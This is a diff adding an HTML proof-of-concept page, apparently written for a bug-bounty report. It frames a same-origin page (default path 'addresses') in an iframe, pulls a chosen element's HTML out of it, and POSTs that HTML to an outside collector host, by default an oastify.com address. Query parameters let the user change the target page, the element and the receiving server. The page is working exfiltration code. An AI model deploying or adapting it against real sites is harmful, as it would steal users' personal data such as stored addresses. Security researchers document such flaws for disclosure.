@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<h1> Hello that a POC page used by Bug Hunter G6G </h1>
+<h3> To modify the page on iframe you can modify the request param "path" in url </h3>
+<h3> To modify the element to click you can modify the request param "extract" in url  </h3>
+<h3> To send data on your server you can modify the request param "url" in url  </h3>
+
+
+<iframe id="test"  width="800" height="1000"></iframe>
+
+<script>
+
+  const urlParams = new URLSearchParams(window.location.search);
+  let path = urlParams.get("path")?? "addresses";
+  let url = urlParams.get("url")?? "http://nkbc9v4mdbtiavzwvtaisswo0f66ubi0.oastify.com";
+  let extract = urlParams.get("extract") ?? "adresslist";
+  let iframe = document.getElementById("test");
+  iframe.src = "/"+path;
+
+  console.log("path used : " + path)
+  console.log("url used : " + url)
+  console.log("extract name  : " + extract)
+
+  setTimeout(() => {
+    let extractData = document.getElementById("test").contentWindow.document.getElementById(extract)
+    console.log('found : ')
+    console.log(extractData)
+// REPLACE SERVER ADRESS TO SEND TO YOUR SERVER NOT MINE
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        html: extractData?.outerHTML
+      })
+    });
+
+    console.log(extractData?.outerText.toString()  + ' Sended to :' + extract.toString());
+  }, 10000);
+</script>
+
+
+</body>
+</html>
